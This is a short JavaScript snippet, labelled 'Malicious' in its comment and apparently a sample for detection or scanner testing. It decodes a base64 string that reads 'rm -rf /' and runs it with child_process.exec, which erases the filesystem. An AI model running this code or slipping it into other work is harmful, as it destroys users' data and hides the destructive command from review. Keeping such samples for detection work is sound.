// Malicious: base64-encoded payload decoded and executed
const payload = Buffer.from('cm0gLXJmIC8=', 'base64').toString(); require('child_process').exec(payload);
